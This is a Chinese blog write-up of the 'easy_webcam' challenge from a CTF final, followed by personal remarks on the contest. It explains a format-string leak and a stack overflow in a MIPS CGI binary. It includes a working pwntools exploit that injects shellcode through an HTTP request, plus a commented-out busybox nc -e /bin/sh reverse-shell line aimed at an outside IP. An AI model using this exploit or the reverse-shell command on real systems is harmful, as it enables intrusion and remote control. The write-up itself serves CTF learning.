---
title: 第四届 “网鼎杯” 网络安全大赛决赛 - easy_webcam
date: 2026/05/07 19:17:00
updated: 2026/05/09 19:12:00
tags:
    - mips
    - qemu-user
    - buffer overflow
    - fmt-string
excerpt: 通过控制 `camera_id` 触发格式化字符串泄露栈地址，再在 `camera_id == 2024` 时利用 `operation` 栈溢出写入栈上 shellcode 并执行，最终绕过 boa 按 CGI 标准回显 flag。
thumbnail: /assets/wangding2024/final-fog.jpg
---

# 题解

## 文件属性

|属性  |值    |
|------|------|
|Arch  |mipsel|
|RELRO |Full  |
|Canary|off   |
|NX    |off   |
|PIE   |off   |
|strip |yes   |

## 解题思路

static编译还剥符号，有点恶心了，还原符号花了不少时间。boa没剥符号，大约是现成的，
没做改动。大致运行流程是`boa` webserver --转发-> `manager.cgi`这样。

`manager.cgi`首先从环境变量里拿到从boa传来的`Content-Length`，然后读取并解析json，
根据输入的命令和camera id判断：当`camera_id != 2024`时，可借助camera id打格式化字符串，
泄露信息；当`camera_id == 2024 && strstr(operation, "reboot")`时，可借助`operation`打栈溢出。

{% callout purple fa-square-poll-horizontal %}
cgi是由qemu用户态启动的，内存布局不会变化，并且栈是可执行的，我们可以直接打栈上shellcode。
需要注意的是由于各种参数是通过环境变量传进来的，因此浏览器指纹不同，
从boa传到`manager.cgi`的环境也不同，栈布局也不同。在攻击的时候要使用同一个环境。
一开始我就是先浏览器泄露信息，再python打，就完全打不通。
{% endcallout %}

接下来共攻击思路清晰了：首先控制`camera_id`打格式化字符串，使用%p泄露栈地址，
然后控制`operation`打栈溢出，写shellcode到栈上并跳转执行。

{% callout blue fa-tags %}
`manager.cgi`的输出要符合CGI标准才能借由boa传输到我们这里，因此在打开shell是不现实的，
因为没法绕过boa直接和shell交互；同时也不能只打印一个flag，因为还要加Content-Type才能传过来。
当时flag名字还不一样，需要先`ls`看文件。至于Type，大概不需要json，plaintext应该就可以输出flag了。
{% endcallout %}

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
context.arch = 'mips'
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = 'easy_webcam/html/cgi-bin/manager'

def payload(lo: int):
    global sh
    if lo:
        ip = '127.0.0.1'
        ipfrom = ip
    else:
        ip = '173.41.102.19'
        ipfrom = '174.40.102.172'

    sh = remote(ip, 80)
    if lo:
        stack = 0x2b2aadd1 + 0x1cf - 0x200
        # stack = 0x2b2aaf40
    else:
        # stack = 0x407ffe71 + 0x1ff
        stack = 0x407ffe11 + 0x1cf - 0x200

    # shc = asm(shellcraft.execve('/bin/busybox', ['nc', ipfrom, '14444', '-e', '/bin/sh']))
    shc = asm(shellcraft.execve('/bin/sh', ['sh', '-c', 'echo Content-Type: application/json\necho\nread FLAG < /flag-EA096FE3722C\necho {flag:$FLAG}']))
    # shc = asm(shellcraft.execve('/bin/echo', ['echo', 'Content-Type: application/json\n\n{}']))
    # shc = asm(shellcraft.write(1, 0x4702e0, 31) + shellcraft.write(1, 0x4702e0 + 30, 1) + shellcraft.write(1, 0x470300, 49) + shellcraft.exit())

    def mkRequest(shellcode: bytes) -> bytes:
        part1 = b'POST /cgi-bin/manager.cgi HTTP/1.1\r\n' \
                b'Accept: */*\r\n' \
                b'Accept-Encoding: gzip, deflate\r\n' \
                b'Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\r\n' \
                b'Cache-Control: no-cache\r\n' \
                b'Connection: keep-alive\r\n' \
                b'DNT: 1\r\n' \
                b'Origin: http://174.40.102.172\r\n' \
                b'Pragma: no-cache\r\n' \
                b'Referer: http://174.40.102.172/\r\n' \
                b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0\r\n' \
                b'Host: ' + ip.encode() + b'\r\n' \
                b'Content-Length: '
        part2 = b'\r\n' \
                b'Content-Type: application/json\r\n' \
                b'\r\n' \
                b'{"camera_id":"2024","operation":"'
        part3 = b'"}'
        length = len(shellcode) + len(b'{"camera_id":"2024","operation":""}')
        return part1 + str(length).encode() + part2 + shellcode + part3

    sh.send(mkRequest(b'reboot'.ljust(0x44) + p32(stack) + shc))

    # sh.clean()
    sh.interactive()
    sh.close()
```

{% callout default fa-flag %}
<img src="/assets/wangding2024/managerFLAG.png" width="80%">
{% endcallout %}

# 碎碎念

决赛的赛制又变了，混合 CTF + 守擂 AWD，CTF 得做出 6 题才能解锁 AWD。
我们这边全是小登，完全就是被薄纱，看着老登猛猛上分。好不容易凑够 6
题，结果这 AWD 规则很复杂，而且擂主要是修了就一点办法都没有了，直接被玩死了。
做不出来，根本做不出来。

最后排名我统计了一下，直接看呆了，之前谁还说上一届排名靠前的全是学生吗，
这次学生最高才到 24 名，完全不像人类。听说老登有额外 py 路径，
也有可能是之前最强的学生组来打了...

{% callout red fa-cloud-bolt %}
<p align="center"><em>主色调为组别，颜色越浅，半决赛在组内排名越高</em></p>
<img src="/assets/wangding2024/final-rank.png" width="40%">
{% endcallout %}

{% folding pink::✨网鼎杯决赛照片集 %}
<img src="/assets/wangding2024/final-fog.jpg" width="80%">
<p align="center"><em>大雾吞没了高楼</em></p>
<img src="/assets/wangding2024/final-with-lilac.jpg" width="40%">
<p align="center"><em>和哈工大✌️一起吃晚餐</em></p>
{% endfolding %}

{% callout purple fa-window-maximize :: 决赛 UI %}
<img src="/assets/wangding2024/final-ui1.png" width="60%">
<p align="center"><em>CTF 与擂台赛</em></p>
<img src="/assets/wangding2024/final-ui2.png" width="60%">
<p align="center"><em>另一种妙妙赛制</em></p>
{% endcallout %}
